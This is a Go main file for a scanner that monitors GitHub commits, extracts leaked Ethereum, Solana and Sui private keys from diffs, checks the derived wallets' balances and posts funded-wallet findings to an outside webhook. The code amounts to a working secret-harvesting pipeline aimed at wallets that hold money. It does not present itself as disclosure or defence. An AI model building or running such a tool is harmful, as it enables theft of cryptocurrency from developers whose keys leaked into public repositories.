package main

import (
	"context"
	"flag"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
)

var logger = log.New(os.Stderr, "[scanner] ", log.LstdFlags)

type Config struct {
	GitHubToken   string
	ETHNodeURL    string
	SolanaNodeURL string
	SuiNodeURL    string
	WebhookURL    string
	Workers       int
	VerifyOnline  bool
	DryRun        bool
}

func main() {
	cfg := &Config{}

	flag.StringVar(&cfg.GitHubToken, "github-token", os.Getenv("GITHUB_TOKEN"),
		"GitHub personal access token (or set GITHUB_TOKEN env)")
	flag.StringVar(&cfg.ETHNodeURL, "eth-rpc", os.Getenv("ETH_RPC_URL"),
		"Ethereum JSON-RPC endpoint (default: Cloudflare public node)")
	flag.StringVar(&cfg.SolanaNodeURL, "sol-rpc", os.Getenv("SOL_RPC_URL"),
		"Solana JSON-RPC endpoint (default: mainnet-beta public node)")
	flag.StringVar(&cfg.SuiNodeURL, "sui-rpc", os.Getenv("SUI_RPC_URL"),
		"Sui JSON-RPC endpoint (default: fullnode.mainnet.sui.io)")
	flag.StringVar(&cfg.WebhookURL, "webhook-url", os.Getenv("WEBHOOK_URL"),
		"Webhook URL for funded-wallet notifications (e.g. your Render backend)")
	flag.IntVar(&cfg.Workers, "workers", 4,
		"Number of parallel commit-diff processing workers")
	flag.BoolVar(&cfg.VerifyOnline, "verify-online", false,
		"Call online verify functions in the blockchain detector (slower)")
	flag.BoolVar(&cfg.DryRun, "dry-run", false,
		"Print what would be notified without sending webhooks")
	flag.Parse()

	if err := run(cfg); err != nil {
		logger.Fatalf("fatal: %v", err)
	}
}

func run(cfg *Config) error {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	go func() {
		mux := http.NewServeMux()
		mux.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
			w.Write([]byte("ok"))
		})
		logger.Printf("health server on :%s", port)
		if err := http.ListenAndServe(":"+port, mux); err != nil {
			logger.Printf("health server exited: %v", err)
		}
	}()

	logger.Printf("starting scanner (workers=%d, dry-run=%v)", cfg.Workers, cfg.DryRun)
	if cfg.GitHubToken == "" {
		logger.Println("warning: no GitHub token set — rate limited to 60 req/hr")
	}

	if cfg.WebhookURL != "" {
		logger.Printf("notifications will POST to %s", cfg.WebhookURL)
	} else {
		logger.Println("No webhook URL configured — funded wallets will be logged only")
	}

	monitor := NewGitHubMonitor(cfg.GitHubToken)

	commitJobs := make(chan CommitJob, 256)
	foundKeys := make(chan FoundKey, 64)

	go monitor.Run(ctx, commitJobs)

	for i := 0; i < cfg.Workers; i++ {
		go commitWorker(ctx, monitor, commitJobs, foundKeys, cfg.VerifyOnline)
	}

	for {
		select {
		case <-ctx.Done():
			return nil
		case key := <-foundKeys:
			handleFoundKey(ctx, key, cfg)
		}
	}
}

func commitWorker(ctx context.Context, mon *GitHubMonitor, jobs <-chan CommitJob, out chan<- FoundKey, verifyOnline bool) {
	for {
		select {
		case <-ctx.Done():
			return
		case job := <-jobs:
			diff, err := mon.FetchCommitDiff(ctx, job.Repo, job.CommitSHA)
			if err != nil {
				logger.Printf("[worker] fetch diff %s/%s: %v", job.Repo, job.CommitSHA, err)
				continue
			}
			keys := ExtractKeys(ctx, diff, job.Repo, job.CommitSHA, verifyOnline)
			for _, k := range keys {
				logger.Printf("[found] chain=%s repo=%s sha=%s", k.Chain, k.Repo, k.CommitSHA)
				select {
				case out <- k:
				case <-ctx.Done():
					return
				}
			}
		}
	}
}

func handleFoundKey(ctx context.Context, key FoundKey, cfg *Config) {
	addrs, err := DeriveAddresses(key)
	if err != nil {
		logger.Printf("[derive] %s key from %s: %v", key.Chain, key.Repo, err)
	}

	balances, err := CheckBalances(ctx, addrs, cfg)
	if err != nil {
		logger.Printf("[balance] error: %v", err)
	}

	for _, b := range balances {
		logBalance(b, key)
		if !b.HasFunds {
			continue
		}
		if cfg.DryRun {
			logger.Printf("[dry-run] would notify about %s %s from %s", b.BalanceHuman, b.Chain, key.Repo)
			continue
		}
		if cfg.WebhookURL != "" {
			notify(ctx, key, b, cfg.WebhookURL)
		}
	}
}

func logBalance(b BalanceResult, key FoundKey) {
	status := "empty"
	if b.HasFunds {
		status = "HAS FUNDS"
	}
	logger.Printf("[balance] %s addr=%s balance=%s [%s] source=%s@%s",
		b.Chain, b.Address, b.BalanceHuman, status, key.Repo, key.CommitSHA[:8])
}
